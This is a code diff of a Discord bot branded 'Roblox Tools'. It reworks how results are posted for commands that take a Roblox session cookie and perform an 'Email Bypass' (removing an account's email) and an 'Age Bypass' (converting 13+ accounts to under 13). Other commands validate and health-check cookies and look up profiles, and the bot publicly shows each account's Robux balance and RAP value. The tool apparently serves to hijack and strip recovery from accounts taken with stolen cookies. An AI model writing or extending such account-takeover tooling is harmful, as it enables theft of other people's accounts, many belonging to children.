@@ -2203,22 +2203,46 @@ client.on('interactionCreate', async interaction => {
 
       const data = await res.json();
 
-      const embed = new EmbedBuilder()
+      // Get Roblox user data for the public embed
+      const robloxData = await getRobloxUserData(cookie);
+
+      const publicEmbed = new EmbedBuilder()
         .setColor(data.status === "success" ? 0x2C2F33 : 0x2C2F33)
-        .setTitle("Email Bypass (2008 Method)")
-        .setDescription("Bypass results from Menhera")
-        .addFields(
-          { name: "Bypass Result", value: data.message || (data.status === "success" ? "Success removing email!" : "Unknown error"), inline: false },
-          { name: "Status", value: data.status === "success" ? "<:yes:1393890949960306719> Completed" : "<:no:1393890945929318542> Failed", inline: true }
-        )
+        .setTitle(robloxData ? `${robloxData.username}` : "Email Bypass (2008 Method)")
+        .setDescription("<:bypass:1397203318060880065> **Email Bypass Service**")
         .setTimestamp()
         .setFooter({
           text: `Requested by ${interaction.user.tag} • Roblox Tools`,
           iconURL: interaction.user.displayAvatarURL()
         });
 
-      // Send the actual embed as public message
-      await interaction.followUp({ embeds: [embed] });
+      // Add Roblox user info if available
+      if (robloxData) {
+        if (robloxData.avatar) {
+          publicEmbed.setThumbnail(robloxData.avatar);
+        }
+
+        publicEmbed.addFields(
+          { name: "**Robux Balance**", value: `<:Robux:1393888802128265348>\`${robloxData.robux}\``, inline: false },
+          { name: "**RAP Value**", value: `<:HeadlessHorseman:1397192572295839806> \`${robloxData.rap}\``, inline: false },
+          { name: "**User ID**", value: `<:member_IDS:1393888535412740096> \`${robloxData.userId}\``, inline: false }
+        );
+      }
+
+      publicEmbed.addFields(
+        { name: "<:bypass:1397203318060880065> Bypass Result", value: data.message || (data.status === "success" ? "Email successfully removed from account." : "Unknown error"), inline: false },
+        { name: "Status", value: data.status === "success" ? "<:yes:1393890949960306719> Completed" : "<:no:1393890945929318542> Failed", inline: true }
+      );
+
+      // Send the public embed directly to the channel
+      await interaction.channel.send({ embeds: [publicEmbed] });
+
+      // Send ephemeral confirmation to user
+      await interaction.followUp({
+        content: '<:yes:1393890949960306719> Email bypass service completed successfully! Check above for the public result.',
+        ephemeral: true
+      });
+
     } catch (error) {
       console.error('Bypass2008 error:', error);
 
@@ -2237,7 +2261,13 @@ client.on('interactionCreate', async interaction => {
         });
 
       // Send the actual embed as public message
-      await interaction.followUp({ embeds: [embed] });
+      await interaction.channel.send({ embeds: [embed] });
+
+      // Send ephemeral error confirmation
+      await interaction.followUp({
+        content: '<:no:1393890945929318542> Email bypass failed. Check above for details.',
+        ephemeral: true
+      });
     }
   }
 
@@ -2262,22 +2292,46 @@ client.on('interactionCreate', async interaction => {
 
       const data = await res.json();
 
-      const embed = new EmbedBuilder()
+      // Get Roblox user data for the public embed
+      const robloxData = await getRobloxUserData(cookie);
+
+      const publicEmbed = new EmbedBuilder()
         .setColor(data.status === "success" ? 0x2C2F33 : 0x2C2F33)
-        .setTitle("Age Bypass (13+ to Under 13)")
-        .setDescription("Bypass results from Menhera")
-        .addFields(
-          { name: "Bypass Result", value: data.message || (data.status === "success" ? "Success converting 13+ to under 13!" : "Unknown error"), inline: false },
-          { name: "Status", value: data.status === "success" ? "<:yes:1393890949960306719> Completed" : "<:no:1393890945929318542> Failed", inline: true }
-        )
+        .setTitle(robloxData ? `${robloxData.username}` : "Age Bypass (13+ to Under 13)")
+        .setDescription("<:bypass:1397203318060880065> **Age Bypass Service**")
         .setTimestamp()
         .setFooter({
           text: `Requested by ${interaction.user.tag} • Roblox Tools`,
           iconURL: interaction.user.displayAvatarURL()
         });
 
-      // Send the actual embed as public message
-      await interaction.followUp({ embeds: [embed] });
+      // Add Roblox user info if available
+      if (robloxData) {
+        if (robloxData.avatar) {
+          publicEmbed.setThumbnail(robloxData.avatar);
+        }
+
+        publicEmbed.addFields(
+          { name: "**Robux Balance**", value: `<:Robux:1393888802128265348>\`${robloxData.robux}\``, inline: false },
+          { name: "**RAP Value**", value: `<:HeadlessHorseman:1397192572295839806> \`${robloxData.rap}\``, inline: false },
+          { name: "**User ID**", value: `<:member_IDS:1393888535412740096> \`${robloxData.userId}\``, inline: false }
+        );
+      }
+
+      publicEmbed.addFields(
+        { name: "<:bypass:1397203318060880065> Bypass Result", value: data.message || (data.status === "success" ? "Account successfully converted to under 13." : "Unknown error"), inline: false },
+        { name: "Status", value: data.status === "success" ? "<:yes:1393890949960306719> Completed" : "<:no:1393890945929318542> Failed", inline: true }
+      );
+
+      // Send the public embed directly to the channel
+      await interaction.channel.send({ embeds: [publicEmbed] });
+
+      // Send ephemeral confirmation to user
+      await interaction.followUp({
+        content: '<:yes:1393890949960306719> Age bypass service completed successfully! Check above for the public result.',
+        ephemeral: true
+      });
+
     } catch (error) {
       console.error('Bypass13plus error:', error);
 
@@ -2296,7 +2350,13 @@ client.on('interactionCreate', async interaction => {
         });
 
       // Send the actual embed as public message
-      await interaction.followUp({ embeds: [embed] });
+      await interaction.channel.send({ embeds: [embed] });
+
+      // Send ephemeral error confirmation
+      await interaction.followUp({
+        content: '<:no:1393890945929318542> Age bypass failed. Check above for details.',
+        ephemeral: true
+      });
     }
   }
 
@@ -2646,10 +2706,10 @@ client.on('interactionCreate', async interaction => {
         // Get detailed Roblox user data
         const robloxData = await getRobloxUserData(cookie);
 
-        const embed = new EmbedBuilder()
+        const publicEmbed = new EmbedBuilder()
           .setColor(0x2C2F33)
           .setTitle(robloxData ? `${robloxData.username}` : '<:yes:1393890949960306719> Cookie Valid!')
-          .setDescription(`**Cookie Validation Complete**\nAuthenticated for user: **${userData.name}**`)
+          .setDescription("🔍 **Cookie Validation Service**")
           .setTimestamp()
           .setFooter({
             text: `Requested by ${interaction.user.tag} • Roblox Tools`,
@@ -2659,51 +2719,82 @@ client.on('interactionCreate', async interaction => {
         // Add Roblox user info if available
         if (robloxData) {
           if (robloxData.avatar) {
-            embed.setThumbnail(robloxData.avatar);
+            publicEmbed.setThumbnail(robloxData.avatar);
           }
 
-          embed.addFields(
+          publicEmbed.addFields(
             { name: "**Robux Balance**", value: `<:Robux:1393888802128265348>\`${robloxData.robux}\``, inline: false },
             { name: "**RAP Value**", value: `<:HeadlessHorseman:1397192572295839806>\`${robloxData.rap}\``, inline: false },
-            { name: "**User ID**", value: `<:member_IDS:1393888535412740096> \`${robloxData.userId}\``, inline: false },
+            { name: "**User ID**", value: `<:member_IDS:1393888535412740096> \`${robloxData.userId}\``, inline: false }
           );
         } else {
-          embed.addFields(
-            { name: "**User ID**", value: `<:member_IDS:1393888535412740096> \`${robloxData.userId}\``, inline: false },
-            { name: ' Display Name', value: `\`${userData.displayName}\``, inline: true },
-            { name: '<:yes:1393890949960306719> Status', value: '`Active`', inline: true }
+          publicEmbed.addFields(
+            { name: "**User ID**", value: `<:member_IDS:1393888535412740096> \`${userData.id}\``, inline: false },
+            { name: ' Display Name', value: `\`${userData.displayName}\``, inline: true }
           );
         }
 
-        // Send the actual embed as public message
-        await interaction.followUp({ embeds: [embed] });
+        publicEmbed.addFields(
+          { name: "🔍 Validation Result", value: `Cookie is valid and authenticated for **${userData.name}**`, inline: false },
+          { name: "Status", value: "<:yes:1393890949960306719> Active", inline: true }
+        );
+
+        // Send the public embed directly to the channel
+        await interaction.channel.send({ embeds: [publicEmbed] });
+
+        // Send ephemeral confirmation to user
+        await interaction.followUp({
+          content: '<:yes:1393890949960306719> Cookie validation completed successfully! Check above for the public result.',
+          ephemeral: true
+        });
+
       } else {
         const embed = new EmbedBuilder()
           .setColor(0x2C2F33)
           .setTitle('<:no:1393890945929318542> Cookie Invalid')
-          .setDescription('The provided cookie is invalid or expired.')
+          .setDescription('🔍 **Cookie Validation Service**\n\nThe provided cookie is invalid or expired.')
+          .addFields(
+            { name: "🔍 Validation Result", value: "Cookie authentication failed", inline: false },
+            { name: "Status", value: "<:no:1393890945929318542> Invalid", inline: true }
+          )
           .setTimestamp()
           .setFooter({
-            text: `Requested by ${interaction.user.tag}`,
+            text: `Requested by ${interaction.user.tag} • Roblox Tools`,
             iconURL: interaction.user.displayAvatarURL()
           });
 
         // Send the actual embed as public message
-        await interaction.followUp({ embeds: [embed] });
+        await interaction.channel.send({ embeds: [embed] });
+
+        // Send ephemeral error confirmation
+        await interaction.followUp({
+          content: '<:no:1393890945929318542> Cookie validation failed. Check above for details.',
+          ephemeral: true
+        });
       }
     } catch (error) {
       const embed = new EmbedBuilder()
         .setColor(0x2C2F33)
         .setTitle('<:no:1393890945929318542> Validation Failed')
-        .setDescription('Unable to validate cookie due to network error.')
+        .setDescription('🔍 **Cookie Validation Service**\n\nUnable to validate cookie due to network error.')
+        .addFields(
+          { name: "🔍 Validation Result", value: "Network error occurred during validation", inline: false },
+          { name: "Status", value: "<:no:1393890945929318542> Error", inline: true }
+        )
         .setTimestamp()
         .setFooter({
-          text: `Requested by ${interaction.user.tag}`,
+          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
           iconURL: interaction.user.displayAvatarURL()
         });
 
       // Send the actual embed as public message
-      await interaction.followUp({ embeds: [embed] });
+      await interaction.channel.send({ embeds: [embed] });
+
+      // Send ephemeral error confirmation
+      await interaction.followUp({
+        content: '<:no:1393890945929318542> Cookie validation failed due to network error. Check above for details.',
+        ephemeral: true
+      });
     }
   }
 
@@ -2759,10 +2850,10 @@ client.on('interactionCreate', async interaction => {
           message = 'Cookie is unreliable and may expire soon. Refresh immediately!';
         }
 
-        const embed = new EmbedBuilder()
+        const publicEmbed = new EmbedBuilder()
           .setColor(color)
           .setTitle(robloxData ? `${robloxData.username}` : 'Cookie Expiry Check')
-          .setDescription(`**Cookie Health Monitor**\n${message}`)
+          .setDescription(`⏰ **Cookie Health Monitor**`)
           .setTimestamp()
           .setFooter({
             text: `Requested by ${interaction.user.tag} • Roblox Tools`,
@@ -2772,10 +2863,10 @@ client.on('interactionCreate', async interaction => {
         // Add Roblox user info if available
         if (robloxData) {
           if (robloxData.avatar) {
-            embed.setThumbnail(robloxData.avatar);
+            publicEmbed.setThumbnail(robloxData.avatar);
           }
 
-          embed.addFields(
+          publicEmbed.addFields(
             { name: "**Robux Balance**", value: `<:Robux:1393888802128265348>\`${robloxData.robux}\``, inline: false },
             { name: "**RAP Value**", value: `<:HeadlessHorseman:1397192572295839806> \`${robloxData.rap}\``, inline: false },
             { name: "**User ID**", value: `<:member_IDS:1393888535412740096> \`${robloxData.userId}\``, inline: false }
@@ -2783,41 +2874,69 @@ client.on('interactionCreate', async interaction => {
         }
 
         // Add expiry check results
-        embed.addFields(
+        publicEmbed.addFields(
+          { name: '⏰ Health Check Result', value: message, inline: false },
           { name: 'Status', value: status, inline: true },
           { name: 'Reliability', value: `${reliability.toFixed(1)}%`, inline: true },
           { name: 'Recommendation', value: reliability >= 90 ? 'No action needed' : 'Consider refreshing', inline: true }
         );
 
-        // Send the actual embed as public message
-        await interaction.followUp({ embeds: [embed] });
+        // Send the public embed directly to the channel
+        await interaction.channel.send({ embeds: [publicEmbed] });
+
+        // Send ephemeral confirmation to user
+        await interaction.followUp({
+          content: '<:yes:1393890949960306719> Cookie expiry check completed successfully! Check above for the public result.',
+          ephemeral: true
+        });
+
       } else {
         const embed = new EmbedBuilder()
           .setColor(0x2C2F33)
           .setTitle('<:no:1393890945929318542> Cookie Expired')
-          .setDescription('The cookie is already invalid or expired.')
+          .setDescription('⏰ **Cookie Health Monitor**\n\nThe cookie is already invalid or expired.')
+          .addFields(
+            { name: '⏰ Health Check Result', value: 'Cookie authentication failed - already expired', inline: false },
+            { name: 'Status', value: '<:no:1393890945929318542> Expired', inline: true }
+          )
           .setTimestamp()
           .setFooter({
-            text: `Requested by ${interaction.user.tag}`,
+            text: `Requested by ${interaction.user.tag} • Roblox Tools`,
             iconURL: interaction.user.displayAvatarURL()
           });
 
         // Send the actual embed as public message
-        await interaction.followUp({ embeds: [embed] });
+        await interaction.channel.send({ embeds: [embed] });
+
+        // Send ephemeral error confirmation
+        await interaction.followUp({
+          content: '<:no:1393890945929318542> Cookie is already expired. Check above for details.',
+          ephemeral: true
+        });
       }
     } catch (error) {
       const embed = new EmbedBuilder()
         .setColor(0x2C2F33)
         .setTitle('<:no:1393890945929318542> Check Failed')
-        .setDescription('Unable to check cookie expiry due to network error.')
+        .setDescription('⏰ **Cookie Health Monitor**\n\nUnable to check cookie expiry due to network error.')
+        .addFields(
+          { name: '⏰ Health Check Result', value: 'Network error occurred during health check', inline: false },
+          { name: 'Status', value: '<:no:1393890945929318542> Error', inline: true }
+        )
         .setTimestamp()
         .setFooter({
-          text: `Requested by ${interaction.user.tag}`,
+          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
           iconURL: interaction.user.displayAvatarURL()
         });
 
       // Send the actual embed as public message
-      await interaction.followUp({ embeds: [embed] });
+      await interaction.channel.send({ embeds: [embed] });
+
+      // Send ephemeral error confirmation
+      await interaction.followUp({
+        content: '<:no:1393890945929318542> Cookie expiry check failed due to network error. Check above for details.',
+        ephemeral: true
+      });
     }
   }
 
@@ -2850,15 +2969,25 @@ client.on('interactionCreate', async interaction => {
           const embed = new EmbedBuilder()
             .setColor(0x2C2F33)
             .setTitle('<:no:1393890945929318542> User Not Found')
-            .setDescription('No user found with that username.')
+            .setDescription('<:member_IDS:1393888535412740096> **Profile Lookup Service**\n\nNo user found with that username.')
+            .addFields(
+              { name: '<:member_IDS:1393888535412740096> Lookup Result', value: 'Username not found in Roblox database', inline: false },
+              { name: 'Status', value: '<:no:1393890945929318542> Not Found', inline: true }
+            )
             .setTimestamp()
             .setFooter({
-              text: `Requested by ${interaction.user.tag}`,
+              text: `Requested by ${interaction.user.tag} • Roblox Tools`,
               iconURL: interaction.user.displayAvatarURL()
             });
 
           // Send the actual embed as public message
-          return interaction.followUp({ embeds: [embed] });
+          await interaction.channel.send({ embeds: [embed] });
+
+          // Send ephemeral error confirmation
+          return interaction.followUp({
+            content: '<:no:1393890945929318542> Profile lookup failed - user not found. Check above for details.',
+            ephemeral: true
+          });
         }
         userId = userData.data[0].id;
       }
@@ -2876,21 +3005,31 @@ client.on('interactionCreate', async interaction => {
         const embed = new EmbedBuilder()
           .setColor(0x2C2F33)
           .setTitle('<:no:1393890945929318542> User Not Found')
-          .setDescription('No user found with that ID.')
+          .setDescription('<:member_IDS:1393888535412740096> **Profile Lookup Service**\n\nNo user found with that ID.')
+          .addFields(
+            { name: '<:member_IDS:1393888535412740096> Lookup Result', value: 'User ID not found in Roblox database', inline: false },
+            { name: 'Status', value: '<:no:1393890945929318542> Not Found', inline: true }
+          )
           .setTimestamp()
           .setFooter({
-            text: `Requested by ${interaction.user.tag}`,
+            text: `Requested by ${interaction.user.tag} • Roblox Tools`,
             iconURL: interaction.user.displayAvatarURL()
           });
 
         // Send the actual embed as public message
-        return interaction.followUp({ embeds: [embed] });
+        await interaction.channel.send({ embeds: [embed] });
+
+        // Send ephemeral error confirmation
+        return interaction.followUp({
+          content: '<:no:1393890945929318542> Profile lookup failed - user not found. Check above for details.',
+          ephemeral: true
+        });
       }
 
-      const embed = new EmbedBuilder()
+      const publicEmbed = new EmbedBuilder()
         .setColor(0x2C2F33)
         .setTitle(`${userInfo.displayName} (@${userInfo.name})`)
-        .setDescription(userInfo.description || 'No description available')
+        .setDescription(`<:member_IDS:1393888535412740096> **Profile Lookup Service**\n\n${userInfo.description || 'No description available'}`)
         .addFields(
           { name: '<:member_IDS:1393888535412740096> User ID', value: `${userInfo.id}`, inline: true },
           { name: 'Username', value: `@${userInfo.name}`, inline: true },
@@ -2901,30 +3040,47 @@ client.on('interactionCreate', async interaction => {
         )
         .setTimestamp()
         .setFooter({
-          text: `Requested by ${interaction.user.tag}`,
+          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
           iconURL: interaction.user.displayAvatarURL()
         });
 
       // Add avatar if available
       if (avatarInfo.data && avatarInfo.data.length > 0) {
-        embed.setThumbnail(avatarInfo.data[0].imageUrl);
+        publicEmbed.setThumbnail(avatarInfo.data[0].imageUrl);
       }
 
-      // Send the actual embed as public message
-      await interaction.followUp({ embeds: [embed] });
+      // Send the public embed directly to the channel
+      await interaction.channel.send({ embeds: [publicEmbed] });
+
+      // Send ephemeral confirmation to user
+      await interaction.followUp({
+        content: '<:yes:1393890949960306719> Profile lookup completed successfully! Check above for the public result.',
+        ephemeral: true
+      });
+
     } catch (error) {
       const embed = new EmbedBuilder()
         .setColor(0x2C2F33)
         .setTitle('<:no:1393890945929318542> Lookup Failed')
-        .setDescription('Unable to lookup profile due to network error.')
+        .setDescription('<:member_IDS:1393888535412740096> **Profile Lookup Service**\n\nUnable to lookup profile due to network error.')
+        .addFields(
+          { name: '<:member_IDS:1393888535412740096> Lookup Result', value: 'Network error occurred during profile lookup', inline: false },
+          { name: 'Status', value: '<:no:1393890945929318542> Error', inline: true }
+        )
         .setTimestamp()
         .setFooter({
-          text: `Requested by ${interaction.user.tag}`,
+          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
           iconURL: interaction.user.displayAvatarURL()
         });
 
       // Send the actual embed as public message
-      await interaction.followUp({ embeds: [embed] });
+      await interaction.channel.send({ embeds: [embed] });
+
+      // Send ephemeral error confirmation
+      await interaction.followUp({
+        content: '<:no:1393890945929318542> Profile lookup failed due to network error. Check above for details.',
+        ephemeral: true
+      });
     }
   }
 
